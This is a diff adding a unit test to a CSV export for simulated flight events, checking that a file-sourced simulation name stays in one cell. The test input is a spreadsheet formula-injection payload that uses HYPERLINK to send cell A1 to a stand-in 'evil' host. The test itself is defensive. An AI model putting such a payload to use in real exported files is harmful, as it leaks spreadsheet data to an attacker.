@@ -287,6 +287,13 @@ describe('flightEventsCsv', () => {
     expect(flightEventsCsv(rows, METRIC_UNITS, name, stage).startsWith('Time (s),')).toBe(true);
   });
 
+  it('keeps a file-sourced simulation name in one cell of the title line', () => {
+    const csvText = flightEventsCsv(rows, METRIC_UNITS, name, stage, 'x,=HYPERLINK("http://evil/?"&A1);=1\t=2');
+    const title = csvText.split('\r\n')[0]!;
+    expect(title).not.toMatch(/[,;\t]/);
+    expect(fields(title)).toHaveLength(1);
+  });
+
   it('quotes a name carrying a comma, so it cannot split the row', () => {
     const csvText = flightEventsCsv(
       [{ ...rows[0]!, branchName: 'Booster, lower' }],
